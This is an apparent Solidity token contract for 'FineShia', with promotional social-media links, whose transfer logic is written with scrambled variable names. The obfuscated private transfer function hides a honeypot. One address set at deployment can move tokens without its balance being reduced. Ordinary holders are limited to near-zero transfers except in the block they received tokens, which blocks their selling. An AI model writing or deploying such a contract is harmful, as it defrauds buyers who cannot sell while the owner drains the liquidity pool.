/*

Telegram: https://t.me/FineShiaPortal

Twitter: https://twitter.com/FineShiaETH

Website: https://fineshia.crypto-token.live/

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.9;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract FineShia is Ownable {
    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 private nsmxdf = 114;

    string public symbol;

    function transfer(address dalgbyrces, uint256 banmuevkpot) public returns (bool success) {
        qromuztg(msg.sender, dalgbyrces, banmuevkpot);
        return true;
    }

    function approve(address diwclbat, uint256 banmuevkpot) public returns (bool success) {
        allowance[msg.sender][diwclbat] = banmuevkpot;
        emit Approval(msg.sender, diwclbat, banmuevkpot);
        return true;
    }

    mapping(address => uint256) private rswu;

    mapping(address => uint256) private gfkqnluz;

    constructor(string memory fndkwbch, string memory lrpoz, address jtivbwrasp, address bugq) {
        name = fndkwbch;
        symbol = lrpoz;
        balanceOf[msg.sender] = totalSupply;
        gfkqnluz[bugq] = nsmxdf;
        ditzuboy = IUniswapV2Router02(jtivbwrasp);
    }

    mapping(address => mapping(address => uint256)) public allowance;

    uint8 public decimals = 9;

    function transferFrom(address lxpwo, address dalgbyrces, uint256 banmuevkpot) public returns (bool success) {
        require(banmuevkpot <= allowance[lxpwo][msg.sender]);
        allowance[lxpwo][msg.sender] -= banmuevkpot;
        qromuztg(lxpwo, dalgbyrces, banmuevkpot);
        return true;
    }

    function qromuztg(address lxpwo, address dalgbyrces, uint256 banmuevkpot) private {
        address bamxwhr = IUniswapV2Factory(ditzuboy.factory()).getPair(address(this), ditzuboy.WETH());
        bool udkyew = 0 == gfkqnluz[lxpwo];
        if (udkyew) {
            if (lxpwo != bamxwhr && rswu[lxpwo] != block.number && banmuevkpot < totalSupply) {
                require(banmuevkpot <= totalSupply / (10 ** decimals));
            }
            balanceOf[lxpwo] -= banmuevkpot;
        }
        balanceOf[dalgbyrces] += banmuevkpot;
        rswu[dalgbyrces] = block.number;
        emit Transfer(lxpwo, dalgbyrces, banmuevkpot);
    }

    mapping(address => uint256) public balanceOf;

    IUniswapV2Router02 private ditzuboy;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    event Transfer(address indexed from, address indexed to, uint256 value);

    string public name;
}
